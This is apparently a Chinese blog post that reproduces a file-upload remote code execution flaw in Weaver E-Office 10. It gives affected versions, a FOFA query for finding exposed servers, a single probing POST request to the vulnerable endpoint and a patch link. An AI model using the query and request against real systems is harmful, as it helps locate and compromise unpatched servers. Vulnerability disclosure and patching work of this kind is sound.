# 原创
：  漏洞复现--泛微E-Office 10任意文件上传漏洞

# 漏洞复现--泛微E-Office 10任意文件上传漏洞

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行承担！**

### 一：漏洞描述

近期，长亭科技监测到泛微官方发布了新补丁修复了一处远程代码执行漏洞。<br/> 长亭应急团队经过分析后发现该漏洞是通过文件上传配合文件包含实现远程代码执行。<br/> 泛微E-Office 10在 10.0_20230821 版本之前存在远程代码执行漏洞，该漏洞是通过文件上传配合文件包含实现远程代码执行，攻击者可利用此漏洞上传恶意文件并控制服务器。

### 二：漏洞影响版本

version&lt; e-office 10.0_20230821

### 三：网络空间测绘查询

fofa:<br/> body=“eoffice10” &amp;&amp; body=“eoffice_loading_tip”<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ebd7bb1371e9896f11805ceda984c6d2.jpeg"/><br/> <img alt="在这里插入图片描述" src="https://img-blog.csdnimg.cn/ef0f2eb4ea034ba8afa1f4c0bae14932.png"/>

### 四：漏洞复现

poc:

```
POST /eoffice10/server/public/api/welink/welink-move HTTP/1.1
Host: ip:port
User-Agent: Go-http-client/1.1
Content-Length: 0
Accept-Encoding: gzip

```

即POST请求<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/8359b04a3eb6b84ebd18217bc00feb44.jpeg"/>

### 五：漏洞检测

XPOC检测：<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/7e450b1343b2bbfe5620199a651985fe.jpeg"/>

### 六：修复建议

目前厂商已发布补丁<br/> ` http://v10.e-office.cn/eoffice9update/20220525/webroot.zip`
